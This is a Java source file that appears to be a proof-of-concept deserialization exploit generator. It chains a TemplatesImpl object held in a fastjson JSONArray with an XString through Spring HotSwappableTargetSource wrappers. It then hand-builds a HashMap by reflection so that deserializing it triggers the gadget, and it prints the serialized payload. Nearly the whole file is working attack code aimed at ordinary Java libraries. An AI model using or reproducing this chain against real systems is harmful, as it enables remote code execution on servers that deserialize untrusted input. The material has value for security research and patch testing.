package com.example;


import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;

public class XStringChain {
    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = Utils.getTemplatesImpl();

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(obj);


        HotSwappableTargetSource h1 = new HotSwappableTargetSource(jsonArray);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("xxx"));

//        HashMap<Object,Object> hashMap = new HashMap<>();
//        hashMap.put(h1,h1);
//        hashMap.put(h2,h2);
//
//        Utils.SetValue(h2,"target",new XString("xxx"));

        HashMap<Object,Object> hashMap = makeMap(h1,h2);


        String barr = Utils.Serialize(hashMap);
        System.out.println(barr);
//        Utils.UnSerialize(barr);

    }

    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        Utils.SetValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Utils.SetValue(s, "table", tbl);
        return s;
    }
}
